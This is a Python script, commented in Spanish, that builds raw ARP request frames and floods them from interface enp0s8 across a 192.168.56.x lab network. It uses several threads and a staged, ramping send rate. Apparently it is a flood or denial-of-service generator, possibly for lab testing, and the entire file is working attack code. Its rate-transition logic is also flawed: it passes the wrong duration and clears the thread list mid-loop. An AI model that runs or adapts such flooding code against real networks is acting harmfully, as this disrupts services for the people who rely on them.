import socket
import struct
import threading
import sys
import signal
import os
import time

src_mac = bytes.fromhex('08:00:27:8b:52:0b'.replace(':', ''))  # MAC de origen
src_ip = '192.168.56.102'  # IP origen
dst_ip = '192.168.56.101'   # IP destino

threads_active = []

def signal_handler(sig, frame):
    print("\nInterrupción detectada. Deteniendo todos los hilos...")
    for thread in threads_active:
        thread.join()
    sys.exit(0)

def create_arp_request(src_mac, src_ip, dst_ip):
    dst_mac = b'\xff\xff\xff\xff\xff\xff'
    eth_type = b'\x08\x06'
    hw_type = b'\x00\x01'
    proto_type = b'\x08\x00'
    hw_size = b'\x06'
    proto_size = b'\x04'
    opcode = b'\x00\x01'
    arp_src_mac = src_mac
    arp_src_ip = socket.inet_aton(src_ip)
    arp_dst_ip = socket.inet_aton(dst_ip)
    arp_frame = hw_type + proto_type + hw_size + proto_size + opcode + arp_src_mac + arp_src_ip + b'\x00\x00\x00\x00\x00\x00' + arp_dst_ip
    packet = dst_mac + src_mac + eth_type + arp_frame
    return packet

def send_arp(src_mac, src_ip, dst_ip, speed, duration):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind(('enp0s8', 0))
    packet = create_arp_request(src_mac, src_ip, dst_ip)
    packet_size = len(packet)
    delay = packet_size / speed  # Intervalo de envío para respetar la velocidad
    end_time = time.time() + duration
    count = 1
    while time.time() < end_time:
        sock.send(packet)
        print(f"Arp {count} enviado")
        time.sleep(delay)
        count +=1

def flood_arp(src_mac, src_ip, dst_ip, threads, speed, duration):
    speed_with_threads = speed / threads
    def worker():
        send_arp(src_mac, src_ip, dst_ip, speed_with_threads, duration)
    global threads_active
    for _ in range(threads):
        thread = threading.Thread(target=worker)
        threads_active.append(thread)
        thread.start()
    for thread in threads_active:
        thread.join()





def flood_arp_speed_series(src_mac, src_ip, dst_ip, threads, speed_list, duration_list):
    """
    Ejecuta un ARP flood con diferentes velocidades y duraciones.

    Parámetros:
    - src_mac: dirección MAC origen en formato bytes
    - src_ip: dirección IP origen
    - dst_ip: dirección IP destino
    - threads: número de hilos
    - speed_list: lista de velocidades en Bytes/s (Ej: [1000, 2000, 3000])
    - duration_list: lista de duraciones en segundos (Ej: [4, 6, 4])
    """
    if len(speed_list) != len(duration_list):
        raise ValueError("Las listas de velocidad y duración deben tener el mismo tamaño")

    # Crear un paquete de prueba para medir su tamaño en bytes
    test_packet = create_arp_request(src_mac, src_ip, dst_ip)
    packet_size = len(test_packet)  # Tamaño del paquete en bytes

    global threads_active

    for i in range(len(speed_list)):
        speed = speed_list[i]
        duration = duration_list[i]

        speed_with_threads = speed / threads

        print(f"\n--- Iniciando etapa {i+1} ---")
        print(f"Tamaño del paquete ARP: {packet_size} bytes")
        print(f"Enviando paquetes a {speed} Bytes/s durante {duration} segundos con {threads} hilos")

        # Función de los hilos
        def worker():
            send_arp(src_mac, src_ip, dst_ip, speed_with_threads, duration)

        # Iniciar hilos
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            threads_active.append(thread)
            thread.start()

        # Esperar a que terminen los hilos antes de pasar a la siguiente velocidad
        for thread in threads_active:
            thread.join()
        threads_active.clear()

    print("\nFlood ARP finalizado.")






def flood_arp_speed_series_transition(src_mac, src_ip, dst_ip, threads, speed_list, duration_list, time_transition, num_transition):
    """
    Ejecuta un ARP flood con diferentes velocidades y duraciones.

    Parámetros:
    - src_mac: dirección MAC origen en formato bytes
    - src_ip: dirección IP origen
    - dst_ip: dirección IP destino
    - threads: número de hilos
    - speed_list: lista de velocidades en Bytes/s (Ej: [1000, 2000, 3000])
    - duration_list: lista de duraciones en segundos (Ej: [4, 6, 4])
    """
    if len(speed_list) != len(duration_list):
        raise ValueError("Las listas de velocidad y duración deben tener el mismo tamaño")

    # Crear un paquete de prueba para medir su tamaño en bytes
    test_packet = create_arp_request(src_mac, src_ip, dst_ip)
    packet_size = len(test_packet)  # Tamaño del paquete en bytes

    global threads_active

    for i in range(len(speed_list)):
        speed = speed_list[i]
        duration = duration_list[i]

        duration_incr = time_transition / num_transition # Duracion de cada etapa de transición entre cada Velocidad del Array

        print(f"\n--- Iniciando etapa {i+1} ---")
        print(f"Tamaño del paquete ARP: {packet_size} bytes")
        print(f"Enviando paquetes a {speed} Bytes/s durante {duration} segundos con {threads} hilos")

        # Función de los hilos
        def worker():
            send_arp(src_mac, src_ip, dst_ip, speed, duration)

        # Iniciar hilos
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            threads_active.append(thread)
            thread.start()

        # Esperar a que terminen los hilos antes de pasar a la siguiente velocidad
        for thread in threads_active:
            thread.join()
        threads_active.clear()

        if i < (len(speed_list) - 1):
            print("Iniciando etapa de transición de incremento de velocidad")
            speed_next = speed_list[i+1]
            increase_speed = (speed_next - speed) / num_transition
            count = 0
            time_end = time.time() + time_transition
            while time.time() < time_end:
                count += 1
                speed += increase_speed
                print(f"\n--- Iniciando etapa de incremento {count} ---")
                print(f"\nEnviando a {speed} Bytes/s durante {duration_incr} segundos")
                
                # Función de los hilos
                def worker():
                    send_arp(src_mac, src_ip, dst_ip, speed, duration)

                # Iniciar hilos
                for _ in range(threads):
                    thread = threading.Thread(target=worker)
                    threads_active.append(thread)
                    thread.start()

                # Esperar a que terminen los hilos antes de pasar a la siguiente velocidad
                for thread in threads_active:
                    thread.join()
                    threads_active.clear()

    print("\nFlood ARP finalizado.")



signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":


    threads = 5
    speed_list = [50, 250, 1000]  # Velocidades en Bytes/s
    duration_list = [4, 4, 4]  # Duraciones en segundos

    time_transition = 30
    num_transition = 10
    flood_arp_speed_series_transition(src_mac, src_ip, dst_ip, threads, speed_list, duration_list, time_transition, num_transition)

